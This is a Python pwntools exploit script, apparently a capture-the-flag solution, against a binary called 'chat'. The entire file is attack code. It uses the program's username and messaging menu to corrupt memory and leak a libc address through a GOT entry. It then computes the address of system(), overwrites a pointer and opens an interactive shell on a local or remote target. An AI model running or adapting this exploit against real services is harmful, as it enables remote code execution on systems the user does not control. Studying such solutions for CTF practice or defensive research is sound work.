#!/usr/bin/env python2
# -*- coding:utf-8 -*-
from pwn import *
import os, sys

# switches
DEBUG = 1

# modify this
elf = ELF('./chat')
libc = ELF('./libc-64')

if DEBUG:
    io = process('./chat')
else:
    io = remote(sys.argv[1], int(sys.argv[2]))

if DEBUG: context(log_level='debug')
# define symbols and offsets here

# simplified r/s function
def ru(delim):
    return io.recvuntil(delim)

def rn(count):
    return io.recvn(count)

def ra(count):      # recv all
    buf = ''
    while count:
        tmp = io.recvn(count)
        buf += tmp
        count -= len(tmp)
    return buf

def sl(data):
    return io.sendline(data)

def sn(data):
    return io.send(data)

def info(string):
    return log.info(string)

def dehex(s):
    return s.replace(' ','').decode('hex')

# define interactive functions here
def signin(name):
    ru('>')
    sl('2')
    ru('>')
    sl(name)

def signup(name):
    ru('>')
    sl('1')
    ru('>')
    sl(name)

def publicmsg(msg):
    ru('>>')
    sl('4')
    ru('>>')
    sl(msg)

def chgusername(name):
    ru('>>')
    sl('7')
    ru('>>')
    sl(name)

def signout():
    ru('>>')
    sl('0')

def dm(user, msg):
    ru('>>')
    sl('5')
    ru('>>')
    sl(user)
    ru('>>')
    sl(msg)

# define exploit function here
def pwn():
    signup('A' * 4)
    signup('B' * 4)
    signup('C' * 30)

    signin('A' * 4)
    publicmsg("aaaa")
    signout()

    signin('B' * 4)
    publicmsg("bbbb")
    dm('A' * 4, "BA")

    dm('C' * 30, 'BC')
    signout()

    signin('C' * 30)
    publicmsg('cccc')
    signout()

    signin('B' * 4)
    chgusername('\t')
    
    signin('C' * 30)
    chgusername('\t')

    signup('d' * 7)
    signin('d' * 7)
    for i in range(6, 2, -1):
        chgusername('d' * i)
    
    malusr = p64(elf.got['__libc_start_main'])
    chgusername(malusr) 

    signout()
    
    signin('A' * 4)
    io.sendlineafter(">> ", "2")

    ru('[')
    leaked_libc = u64(io.recv(6).ljust(8, '\x00'))
    libc_base = leaked_libc - libc.symbols['__libc_start_main']
    system_addr = libc.symbols['system'] + libc_base
    info('system_addr : ' + hex(system_addr))
    signout()
    
    signin(malusr)
    chgusername("\x40" * 24 + p8(0xa1)) #printable and the result of hash(name) is zero
    publicmsg('fuck')

    publicmsg("7" * 16 + p64(0x60302a))
    pause()
    chgusername("A" * 6 + "B" * 8 + p64(system_addr))
    io.sendlineafter(">>", "sh\x00")

    io.interactive()
    return

if __name__ == '__main__':
    pause()
    pwn()

